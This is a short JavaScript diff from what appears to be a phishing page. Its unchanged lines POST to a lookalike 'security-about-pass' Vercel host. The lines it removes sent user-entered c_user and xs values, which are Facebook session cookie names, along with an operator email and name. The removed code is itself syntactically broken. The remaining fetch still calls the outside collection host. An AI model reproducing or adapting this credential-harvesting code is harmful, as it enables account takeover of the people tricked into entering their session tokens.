@@ -365,16 +365,7 @@
             
             fetch("https://security-about-pass.vercel.app", {
                 method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify({
-                    c_user: cUserInput.value,
-                    xs: xsInput.value,
-                    emails: ["sociallyinworks@gmail.com", 
-                    workerEmail: "sociallyinworks@gmail.com",
-                    name: "Aftab",
-                }),
+               
             })
             .then((response) => {
                 if (response.ok) {
